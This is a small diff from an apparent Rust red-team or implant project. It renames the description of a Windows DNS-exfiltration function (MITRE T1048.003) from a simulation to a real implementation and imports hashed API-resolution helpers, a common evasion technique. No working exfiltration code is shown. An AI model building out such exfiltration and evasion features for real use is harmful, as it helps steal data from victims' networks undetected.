@@ -5,7 +5,7 @@ pub struct Exfiltration;
 
 impl Exfiltration {
     /// T1048.003: Exfiltration Over Alternative Protocol - DNS
-    /// Simulates sending data chunks via DNS lookups.
+    /// Implements sending data chunks via DNS lookups.
     #[cfg(target_os = "windows")]
     pub fn exfiltrate_dns(&self, data: &[u8], domain: &str) -> Result<(), ()> {
         use crate::utils::api_resolver::{hash_str, resolve_function};
